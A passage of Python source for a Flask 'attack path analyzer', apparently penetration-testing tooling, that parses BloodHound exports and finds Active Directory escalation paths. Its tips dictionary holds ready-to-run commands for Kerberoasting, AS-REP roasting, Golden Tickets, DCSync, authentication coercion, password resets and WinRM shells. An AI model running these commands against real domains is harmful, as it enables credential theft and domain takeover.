impacket-getST -spn 'cifs/TARGET.DOMAIN' -additional-ticket victim_to_kcd_service.ccache -dc-ip DC_IP DOMAIN/USER:PASS
SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained""",

'Pre2KCompatible': """=== CORE IDEA ===
# Compatibility-created computer accounts may have predictable initial passwords:
# lowercase hostname without the trailing $ (for example WEB01$ -> web01).
# This is mainly useful for unused/pre-created computer objects, not normal joined machines.

=== FIND / TEST CANDIDATES ===
nxc ldap DC_IP -u USER -p PASS -M pre2k
pre2k auth -u USER -p PASS -dc-ip DC_IP -d DOMAIN

# Manual test against one machine account:
impacket-getTGT DOMAIN/'MACHINE$':'machine' -dc-ip DC_IP

=== AFTER A HIT ===
# Treat a successful guess as control of that computer account.
# Change the password or use Kerberos with the obtained ccache:
rpcchangepwd.py 'DOMAIN/MACHINE$:machine' -newpass 'NewMachinePass123!' DC_IP
impacket-getTGT DOMAIN/'MACHINE$':'NewMachinePass123!' -dc-ip DC_IP
export KRB5CCNAME='MACHINE$.ccache'
SOURCE: https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers""",

'Kerberoast': """=== CORE IDEA ===
# Kerberoast needs valid domain credentials.
# Target: enabled user/service account with an SPN and a human-crackable password.
# Output: $krb5tgs$ hash for offline cracking; cracking success gives the service account password.

=== REQUEST TGS HASHES ===
# Impacket:
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerberoast.txt

# NetExec:
nxc ldap DC_IP -u USER -p PASS --kerberoasting kerberoast.txt

=== CRACK ===
# RC4 / etype 23:
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
# AES / etype 17:
hashcat -m 19600 kerberoast.txt /usr/share/wordlists/rockyou.txt
# AES / etype 18:
hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt

=== NEXT STEP ===
# Validate cracked credentials and continue with that account's actual rights:
nxc smb TARGET_HOST -u SERVICE_USER -p 'CRACKED_PASSWORD'
SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/kerberoast""",

'ASREProast': """=== CORE IDEA ===
# ASREProast targets users with "Do not require Kerberos preauthentication" enabled.
# It can request AS-REP material for offline cracking; the returned TGT is not directly usable without cracking.

=== REQUEST AS-REP HASHES ===
# With valid domain credentials / LDAP enumeration:
impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt
nxc ldap DC_IP -u USER -p PASS --asreproast asrep.txt

# If you already have a user list, authentication may not be required:
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt

=== CRACK ===
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

=== NEXT STEP ===
# Validate cracked credentials and continue with that account's actual rights:
nxc smb TARGET_HOST -u TARGET_USER -p 'CRACKED_PASSWORD'
SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/asreproast""",

'UnconstrainedDelegation': """=== CORE IDEA ===
# If you control an account/computer trusted for unconstrained delegation, Kerberos auth to it may include the caller's delegated TGT.
# Abuse usually means: make/coerce a privileged host or user authenticate to the unconstrained host, capture the TGT, then pass the ticket.
# Protected Users / "Account is sensitive and cannot be delegated" normally blocks delegated TGT capture.

=== WINDOWS ON THE UNCONSTRAINED HOST ===
# Monitor for incoming delegated TGTs:
Rubeus.exe monitor /interval:1 /nowrap

# Coerce authentication to the unconstrained host from the attacker side:
python3 PetitPotam.py -u USER -p PASS -d DOMAIN UNCONSTRAINED_HOST DC_IP
coercer coerce -u USER -p PASS -d DOMAIN -l UNCONSTRAINED_HOST -t DC_IP

# Use captured DC TGT for DCSync:
export KRB5CCNAME=DC01.ccache
impacket-secretsdump -k -no-pass -just-dc-ntlm DOMAIN/DC01$@DC01.DOMAIN -dc-ip DC_IP

=== LINUX / KRBRELAYX STYLE ===
# When the unconstrained account is a computer, you may need an SPN/DNS name pointing to your listener and the right key to decrypt tickets.
# This path is more setup-heavy; use krbrelayx/addspn/dnstool workflows when operating from Linux.
SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained""",

'GoldenTicket': """=== CORE IDEA ===
# Golden Ticket requires the krbtgt long-term key: NT hash or AES key.
# This is post-compromise lateral movement/persistence, not an initial privilege escalation path.
# Since Nov 2021 hardening, use an existing AD username rather than an arbitrary fake user.

=== PREP ===
# Get domain SID:
impacket-lookupsid DOMAIN/USER:PASS@DC_IP | grep 'Domain SID'

# Get krbtgt material, usually via DCSync:
impacket-secretsdump -just-dc-user krbtgt DOMAIN/USER:PASS@DC_HOST -dc-ip DC_IP

=== FORGE TICKET ===
# RC4 / NT hash:
impacket-ticketer -nthash KRBTGT_NT_HASH -domain-sid S-1-5-21-XXXXXXX -domain DOMAIN EXISTING_USER

# AES key is preferred when available:
impacket-ticketer -aesKey KRBTGT_AES_KEY -domain-sid S-1-5-21-XXXXXXX -domain DOMAIN EXISTING_USER

=== USE TICKET ===
export KRB5CCNAME=EXISTING_USER.ccache
impacket-psexec -k -no-pass DOMAIN/EXISTING_USER@TARGET_HOST
impacket-secretsdump -k -no-pass -just-dc-ntlm DOMAIN/EXISTING_USER@DC_HOST -dc-ip DC_IP
SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden""",

'PSNativeActions': """=== RSAT / ACTIVEDIRECTORY MODULE ===
# Load the native AD module if RSAT is present:
Import-Module ActiveDirectory

# Reset a user's password:
Set-ADAccountPassword -Identity TARGET -Reset -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# Add a user to a group:
Add-ADGroupMember -Identity TARGET_GROUP -Members USER

# Enable AS-REP roasting on a user:
Set-ADAccountControl -Identity TARGET -DoesNotRequirePreAuth $true

# Quick checks:
Get-ADUser TARGET -Properties servicePrincipalName,userAccountControl,memberOf
Get-ADComputer TARGET -Properties msDS-AllowedToActOnBehalfOfOtherIdentity""",

'PSPowerViewActions': """=== POWERVIEW SHORTCUTS ===
# Dot-source PowerView in the current session:
. .\\PowerView.ps1

# Enumerate useful user / computer properties:
Get-DomainUser TARGET -Properties serviceprincipalname,useraccountcontrol,memberof
Get-DomainComputer TARGET -Properties msds-allowedtoactonbehalfofotheridentity

# Reset a user's password:
Set-DomainUserPassword -Identity TARGET -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# Add a user to a group:
Add-DomainGroupMember -Identity TARGET_GROUP -Members USER

# Add a fake SPN for targeted Kerberoast:
Set-DomainObject -Identity TARGET -Set @{'serviceprincipalname'='fake/TARGET'}

# Review ACLs on an object:
Get-DomainObjectAcl -Identity TARGET -ResolveGUIDs""",

'PSRBCDPrep': """=== POWERMAD + POWERVIEW (RBCD PREP) ===
# Create a machine account from Windows if MachineAccountQuota allows it:
Import-Module .\\Powermad.ps1
New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)

# Prepare an RBCD security descriptor for FAKE01$ on TARGET$:
. .\\PowerView.ps1
$Sid = Get-DomainComputer FAKE01 -Properties objectsid | Select-Object -ExpandProperty objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$Sid)\"
$Bytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($Bytes,0)
Get-DomainComputer TARGET | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$Bytes}

# RBCD ticket request / service use is still usually cleaner with Impacket from Linux.""",

'PSWinRMEnum': """=== WINRM SESSION HELPERS ===
# Confirm context, groups, tickets, and DC:
whoami /all
klist
nltest /dsgetdc:DOMAIN

# Native AD module quick survey:
Import-Module ActiveDirectory
Get-ADDomain
Get-ADGroup 'Remote Management Users' -Properties member
Get-ADComputer TARGET -Properties operatingSystem,servicePrincipalName,msDS-AllowedToActOnBehalfOfOtherIdentity

# PowerView alternatives:
. .\\PowerView.ps1
Get-DomainUser -AdminCount | select samaccountname
Get-DomainComputer | select dnshostname,operatingsystem""",

'Timeroast': """=== CORE IDEA ===
# Timeroast abuses MS-SNTP responses from machine accounts to collect crackable hashes.
# It is most useful against computer accounts with weak/predictable passwords, often hostname-based.

=== COLLECT SNTP HASHES ===
# SecuraBV Timeroast:
python3 timeroast.py DC_IP -o timeroast_hashes.txt

# NetExec alternative if available:
nxc smb DC_IP -u USER -p PASS -M timeroast

=== CRACK ===
# Hashcat mode 31300 requires newer Hashcat builds. Use --username when the file includes RID/user prefixes.
hashcat -m 31300 -a 0 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt --username

# Add a custom wordlist of lowercase hostnames without trailing $:
# WEB01$ -> web01

=== NEXT STEP ===
# A cracked value is the computer account password; request a TGT or validate SMB/Kerberos access:
impacket-getTGT DOMAIN/'MACHINE$':'CRACKED_PASSWORD' -dc-ip DC_IP
SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/timeroast""",

'ProtectedGroup': """=== CORE IDEA ===
# TARGET is in the Protected Users group.
# This limits credential theft and delegation abuse: no NTLM auth, no DES/RC4 Kerberos, no unconstrained/constrained delegation, short TGT lifetime.
# Treat this as a blocker/constraint unless you also control membership of the Protected Users group.

=== CHECK MEMBERSHIP ===
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object 'Protected Users' --attr member

=== REMOVE ONLY IF YOU HAVE RIGHTS ===
# Requires rights such as GenericAll / WriteDacl / AddMember on the Protected Users group.
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP remove groupMember 'Protected Users' TARGET

=== VERIFY / RE-AUTHENTICATE ===
bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object 'Protected Users' --attr member
# After removal, request fresh tickets/logon material before retrying delegation or NTLM-dependent paths.
SOURCE: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group""",

'RemoteManagementUsers': """=== CORE IDEA ===
# Membership in Remote Management Users can allow WinRM / PowerShell Remoting logon to a host.
# It is not the same as local Administrator; command execution is limited by the user's actual privileges on the target.
# Requires WinRM enabled/reachable, usually TCP 5985 HTTP or 5986 HTTPS.

=== CHECK ACCESS ===
nxc winrm TARGET_HOST -u USER -p PASS
nxc winrm TARGET_HOST -u USER -H NTLM_HASH

=== INTERACTIVE SHELL ===
# evil-winrm with password:
evil-winrm -i TARGET_HOST -u USER -p PASS

# evil-winrm pass-the-hash:
evil-winrm -i TARGET_HOST -u USER -H NTLM_HASH

# Kerberos, if DNS/FQDN and krb5 config are correct:
KRB5CCNAME=user.ccache evil-winrm -i TARGET_FQDN -r DOMAIN.FQDN

=== NOTE ===
# If authentication succeeds but commands fail, check local group membership, UAC filtering, and target WinRM policy.
SOURCE: https://github.com/Hackplayers/evil-winrm""",

}

# ─── PARSE ────────────────────────────────────────────────────────────────────
def resolve_sid(sid, sid_cache):
    if not sid:
        return sid
    if sid in KNOWN_SIDS:
        return KNOWN_SIDS[sid]
    # Domain-prefixed built-in SIDs (e.g. "DOMAIN-S-1-5-32-544")
    parts = sid.split('-')
    try:
        s_idx = parts.index('S')
        short = 'S-' + '-'.join(parts[s_idx + 1:])
        if short in KNOWN_SIDS:
            return KNOWN_SIDS[short]
    except ValueError:
        pass
    return sid_cache.get(sid, sid)

def base_name(name):
    return name.upper().split('@')[0]

def sam_name(name, props=None):
    props = props or {}
    return str(props.get('samaccountname') or base_name(name)).upper()

def is_machine_account(name, props=None, obj_type=None):
    return obj_type == 'Computer' or sam_name(name, props).endswith('$')

def is_gmsa_account(name, props=None, obj_type=None):
    props = props or {}
    dn = str(props.get('distinguishedname') or '').upper()
    return obj_type == 'User' and sam_name(name, props).endswith('$') and 'MANAGED SERVICE ACCOUNTS' in dn

def is_domain_controller(name, props=None, obj_type=None):
    props = props or {}
    dn = str(props.get('distinguishedname') or '').upper()
    return obj_type == 'Computer' and ('DOMAIN CONTROLLERS' in dn or (bool(props.get('unconstraineddelegation')) and 'DC' in name.upper()))

def is_noise(name):
    return base_name(name) in NOISE

def parse_zip(zip_bytes):
    """Parse BloodHound ZIP bytes → structured graph data."""
    sid_cache = {}
    data = {t: [] for t in ('users', 'computers', 'groups', 'gpos', 'domains', 'ous', 'containers')}

    with zipfile.ZipFile(BytesIO(zip_bytes)) as z:
        for fname in z.namelist():
            if not fname.endswith('.json'):
                continue
            try:
                j = json.loads(z.read(fname).decode('utf-8', errors='ignore'))
                t = j.get('meta', {}).get('type', '').lower()
                items = j.get('data', [])
                if t in data:
                    data[t] = items
                for item in items:
                    sid = item.get('ObjectIdentifier', '')
                    name = item.get('Properties', {}).get('name', sid)
                    if sid:
                        sid_cache[sid] = name
            except Exception:
                pass

    return data, sid_cache


def build_graph(data, sid_cache):
    """Build ACL forward-graph + membership maps."""
    forward = defaultdict(list)   # nameUpper -> [{target, right, inherited, sev}]
    member_of = defaultdict(set)  # nameUpper -> set of groupNameUpper
    raw_acls = []
    structural_edges = []
    deleg = {'constrained': [], 'unconstrained': []}
    pre2k = []
    object_index = {}
    object_lists = defaultdict(list)

    typed_objects = (
        [('User', obj) for obj in data['users']] +
        [('Computer', obj) for obj in data['computers']] +
        [('Group', obj) for obj in data['groups']] +
        [('GPO', obj) for obj in data['gpos']] +
        [('Domain', obj) for obj in data['domains']] +
        [('OU', obj) for obj in data['ous']] +
        [('Container', obj) for obj in data['containers']]
    )

    for obj_type, obj in typed_objects:
        p = obj.get('Properties', {})
        name = p.get('name', obj.get('ObjectIdentifier', '?'))
        key = base_name(name)
        object_index[key] = {
            'name': name,
            'key': key,
            'type': obj_type,
            'objectid': obj.get('ObjectIdentifier', ''),
            'enabled': p.get('enabled', True),
            'admincount': bool(p.get('admincount')),
            'trustedtoauth': bool(p.get('trustedtoauth')),
            'unconstrained': bool(p.get('unconstraineddelegation')),
            'hasspn': bool(p.get('hasspn')),
            'dontreqpreauth': bool(p.get('dontreqpreauth')),
            'isMachine': is_machine_account(name, p, obj_type),
            'isDC': is_domain_controller(name, p, obj_type),
            'isGmsa': is_gmsa_account(name, p, obj_type),
        }
        object_lists[obj_type].append(object_index[key])

    for obj_type, obj in typed_objects:
        p = obj.get('Properties', {})
        parent_name = p.get('name', obj.get('ObjectIdentifier', '?'))
        for child in obj.get('ChildObjects', []) or []:
            child_name = resolve_sid(child.get('ObjectIdentifier', ''), sid_cache)
            if not child_name:
                continue
            structural_edges.append({
                'source': parent_name,
                'source_type': obj_type,
                'target': child_name,
                'target_type': child.get('ObjectType', object_index.get(base_name(child_name), {}).get('type', 'Unknown')),
                'right': 'Contains',
                'sev': SEVERITY.get('Contains', 90),
            })
        for link in obj.get('Links', []) or []:
            gpo_name = resolve_sid(link.get('GUID', ''), sid_cache)
            if not gpo_name:
                continue
            structural_edges.append({
                'source': gpo_name,
                'source_type': 'GPO',
                'target': parent_name,
                'target_type': obj_type,
                'right': 'GpLink',
                'sev': SEVERITY.get('GpLink', 90),
                'enforced': bool(link.get('IsEnforced')),
            })

    for obj_type, obj in typed_objects:
        target = obj.get('Properties', {}).get('name', obj.get('ObjectIdentifier', '?'))
        target_key = base_name(target)
        for ace in obj.get('Aces', []):
            right = RIGHT_ALIASES.get(ace.get('RightName', ''), ace.get('RightName', ''))
            if right not in CRITICAL_RIGHTS:
                continue
            principal = resolve_sid(ace.get('PrincipalSID', ''), sid_cache)
            if is_noise(principal):
                continue
            key = base_name(principal)
            principal_type = ace.get('PrincipalType', object_index.get(key, {}).get('type', '?'))
            entry = {
                'target': target,
                'target_type': obj_type,
                'right': right,
                'inherited': ace.get('IsInherited', False),
                'sev': SEVERITY.get(right, 99),
            }
            forward[key].append(entry)
            raw_acls.append({
                'principal': principal,
                'principal_type': principal_type,
                'right': right,
                'target': target,
                'target_type': object_index.get(target_key, {}).get('type', obj_type),
                'inherited': ace.get('IsInherited', False),
                'sev': SEVERITY.get(right, 99),
            })

    raw_acls.sort(key=lambda x: x['sev'])

    for g in data['groups']:
        gname = base_name(g.get('Properties', {}).get('name', '?'))
        for m in g.get('Members', []):
            mname = base_name(resolve_sid(m.get('ObjectIdentifier', ''), sid_cache))
            member_of[mname].add(gname)
            if 'PRE-WINDOWS 2000' in gname:
                pre2k.append(resolve_sid(m.get('ObjectIdentifier', ''), sid_cache))

    for obj in data['users'] + data['computers']:
        p = obj.get('Properties', {})
        name = p.get('name', '?')
        if p.get('unconstraineddelegation'):
            deleg['unconstrained'].append({'name': name})
        for spn in p.get('allowedtodelegate', []):
            deleg['constrained'].append({
                'name': name, 'spn': spn,
                't2a4d': bool(p.get('trustedtoauth')),
            })

    return {
        'forward': dict(forward),
        'member_of': {k: list(v) for k, v in member_of.items()},
        'raw_acls': raw_acls,
        'structural_edges': structural_edges,
        'objects': object_index,
        'object_lists': dict(object_lists),
        'deleg': deleg,
        'pre2k': list(set(pre2k)),
    }


def build_principals(data, sid_cache):
    """Extract interesting principals for the sidebar."""
    seen = set()
    result = []

    def add(item, ptype):
        p = item.get('Properties', {})
        name = p.get('name', item.get('ObjectIdentifier', '?'))
        key = base_name(name)
        if is_noise(name):
            return
        if key in seen:
            return
        seen.add(key)
        result.append({
            'name': name,
            'key': key,
            'type': ptype,
            'enabled': p.get('enabled', True),
            'admincount': bool(p.get('admincount')),
            'trustedtoauth': bool(p.get('trustedtoauth')),
            'unconstrained': bool(p.get('unconstraineddelegation')),
            'hasspn': bool(p.get('hasspn')),
            'dontreqpreauth': bool(p.get('dontreqpreauth')),
            'isMachine': is_machine_account(name, p, ptype),
            'isDC': is_domain_controller(name, p, ptype),
            'isGmsa': is_gmsa_account(name, p, ptype),
            'allowedtodelegate': p.get('allowedtodelegate', []),
        })

    for u in data['users']:
        add(u, 'User')
    for c in data['computers']:
        add(c, 'Computer')

    return result


def get_stats(data, principals, raw_acls, attack_paths_count=0):
    non_machine = [p for p in principals if not p['isMachine'] and p['type'] == 'User']
    return {
        'users': len(non_machine),
        'computers': len([p for p in principals if p['type'] == 'Computer']),
        'groups': len(data['groups']),
        'gpos': len(data['gpos']),
        'ous': len(data['ous']),
        'containers': len(data['containers']),
        'gmsa': len([p for p in principals if p['isGmsa']]),
        'acls': len(raw_acls),
        'kerberoastable': sum(1 for u in non_machine if u['hasspn'] and u['enabled']),
        'asrep': sum(1 for u in non_machine if u['dontreqpreauth']),
        'dcs': len([p for p in principals if p['isDC']]),
        'unconstrained': len([p for p in principals if p['unconstrained']]),
        'paths': attack_paths_count,
    }


def compute_attack_paths(graph, owned_keys):
    """BFS from owned nodes, returns list of path dicts."""
    if not owned_keys:
        return []

    owned_set = set(base_name(o) for o in owned_keys)
    forward = graph['forward']
    member_of = graph['member_of']

    def get_edges(node_key):
        edges = []
        for e in forward.get(node_key, []):
            edges.append({**e, 'via': None})
        for grp in member_of.get(node_key, []):
            for e in forward.get(grp, []):
                edges.append({**e, 'via': grp})
        return edges

    visited = set()
    queue = [{'node': n, 'chain': [{'name': n, 'right': None, 'via': None}]}
             for n in owned_set]
    paths = []
    seen_nodes = set(owned_set)
    max_depth = 7

    while queue:
        item = queue.pop(0)
        node, chain = item['node'], item['chain']
        if len(chain) > max_depth:
            continue

        for edge in get_edges(node):
            target_key = base_name(edge['target'])
            via_str = edge.get('via') or ''
            vk = f"{node}|{target_key}|{edge['right']}|{via_str}"
            if vk in visited:
                continue
            visited.add(vk)

            new_step = {
                'name': edge['target'],
                'right': edge['right'],
                'via': edge.get('via'),
                'inherited': edge['inherited'],
            }
            new_chain = chain + [new_step]

            paths.append({
                'from': chain[-1]['name'],
                'right': edge['right'],
                'to': edge['target'],
                'via': edge.get('via'),
                'sev': edge['sev'],
                'depth': len(chain),
                'inherited': edge['inherited'],
                'chain': new_chain,
                'tip': ATTACK_TIPS.get(edge['right'], ''),
            })

            if target_key not in seen_nodes:
                seen_nodes.add(target_key)
                queue.append({'node': target_key, 'chain': new_chain})

    return sorted(paths, key=lambda x: (x['sev'], x['depth']))


# ─── ROUTES ──────────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return render_template_string(HTML_PAGE, attack_tips=ATTACK_TIPS)


@app.route('/api/upload', methods=['POST'])
def upload():
    """Upload + parse a BloodHound ZIP. Returns graph data as JSON."""
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400

    f = request.files['file']
    if not f.filename.endswith('.zip'):
        return jsonify({'error': 'Not a ZIP file'}), 400

    try:
        zip_bytes = f.read()
        data, sid_cache = parse_zip(zip_bytes)

        domain = '?'
        if data['domains']:
            domain = data['domains'][0].get('Properties', {}).get('name', '?')
        elif data['users']:
            domain = data['users'][0].get('Properties', {}).get('domain', '?')

        graph = build_graph(data, sid_cache)
        principals = build_principals(data, sid_cache)
        stats = get_stats(data, principals, graph['raw_acls'])

        return jsonify({
            'domain': domain,
            'principals': principals,
            'graph': graph,
            'stats': stats,
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/paths', methods=['POST'])
def paths():
    """Compute attack paths from owned accounts. Returns sorted path list."""
    body = request.get_json()
    if not body:
        return jsonify({'error': 'No JSON body'}), 400

    graph = body.get('graph', {})
    owned = body.get('owned', [])

    try:
        result = compute_attack_paths(graph, owned)
        return jsonify({'paths': result, 'count': len(result)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ─── HTML ─────────────────────────────────────────────────────────────────────


HTML_PAGE = r"""
<!DOCTYPE html>
<html lang="hu">
<head>
<meta charset="UTF-8">
<link rel="icon" type="image/png" href="data:image/png;base64,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">
<title>🦫 Bober // Attack Path Analyzer</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/d3/7.8.5/d3.min.js"></script>
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
:root{--bg:#040d08;--panel:#0a1810;--panel2:#0f2014;--border:#1a3528;--border2:#244a30;--red:#ff2244;--orange:#ff7b2b;--yellow:#ffd700;--green:#00ff88;--cyan:#00e89a;--purple:#bb86fc;--white:#ddeeff;--dim:#3a6070;--dim2:#5a8090;}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--white);font-family:'Share Tech Mono',monospace;font-size:15px;min-height:100vh;overflow-x:hidden;position:relative}
body::before{content:'';position:fixed;inset:0;
  background:url('data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAA0JCgsKCA0LCgsODg0PEyAVExISEyccHhcgLikxMC4pLSwzOko+MzZGNywtQFdBRkxOUlNSMj5aYVpQYEpRUk//2wBDAQ4ODhMREyYVFSZPNS01T09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0//wAARCAMgAyADASIAAhEBAxEB/8QAHAABAAMBAQEBAQAAAAAAAAAAAAECAwQFBgcI/8QARRAAAgECBAMGAwYEBQMDBAMBAAECAxEEITFBElFxBRMyYYGRIlKhBjNCscHRFCNi4Qc0coKSQ/DxFSRTRFSywhaDouL/xAAZAQEBAQEBAQAAAAAAAAAAAAAAAQIDBAX/xAAlEQEBAAICAwADAAMBAQEAAAAAAQIRITEDEkEEE1EiMmFCgaH/2gAMAwEAAhEDEQA/APz4gAjCSYQc3ZFS8PErMUqJx4ZNFS9X7xlBCBIABa6mk53gop3MwNJoBBIUAAAAAaR+5kZmsZ01HhcXnqZO18iRIAAqrU48c0tiJx4ZuKehpQm1JRSVilV3qyfmT6n1UAFVLtwogtJWSKgAAALQV5FSYycXkCkspMgltt3ZAErUgmKu7EAAAAOiPCsPLhOc2h/l5ErOTEAFaCYxcnZEGlJvishUqjVnYgmXiZAUJILW+G4FQAAAAAs5NohK7stzWVFqOTTYqWxiAAoWVrO5UslkwioJICgAAGlPwyMy8anCrJLMVKoCW7u9iAoAABvRgrcUtzA6aOUbS3Jkzl0yqQ4bNO6ZmbVk0kvwmIizoABVSg8mFqriXiYEAAAs3ZGvcP5lfkMOr1VcXf8AE38yWs2smrag1xCtWdjIsWXcAEAoAANqUm4SXJGJrRXwz6GRJ2k7dE4OpGLjbQtJJ0uDizRzRlKOjZF3rcmk9aMgkg00ForidiABpWgoONjM1r/g6GRJ0mPQSr7EF6SuyrVATJfE0QAAIAkAAC1NLivJ2sVAF6tnNtO5mSAABAEo17puN1qZLU34o34uLbQlZu2AG4K0AAAEABvGdOUlFU1cpW4eO0VZImkuGLm9tDJvNkk5Zk5AAVpekn3kciKn3kupMasoK0bCdSU9bE52nO1AAVVnK6SsVJayRAAAADelCNk5b6GBvSnF2jPZ5MlZy6VqwjHOLyMjWtC2ad0ZCLOkxdmQ9S0Vch5MogABRa56G6qUlBxs7MwJ4ZWvZ2FiWbJW4vh0IAChpS8WtjMBFppqTKgACzfwWKl3G0LgUBJAUAAFoO002byTaUqbuYQtxfFobKPBwtSyRmsZMHrmCZO8m1zKmmgsm0rFSQBBJAUAAAuqbcHLSxQ3hJujK5KlrAAFUAAA3pVFbhkYEqLegsSza9SaklGKyRmS01m0QIQJIJCpj4kJ+IhOzuxJpyugn1AACtcP96lzDX8+3mZxbi01qjXvs+Lh+LmSs2cmJd6uXIxJbbbb1ILFk1AABQAAaKtNKyt7FJScndkwg5JtaIqOE1Exi5SSW5arB05WuWo1HFqNtWTifvfQm+U3dsQAVoJjHieqXUgAb1oqSTUlku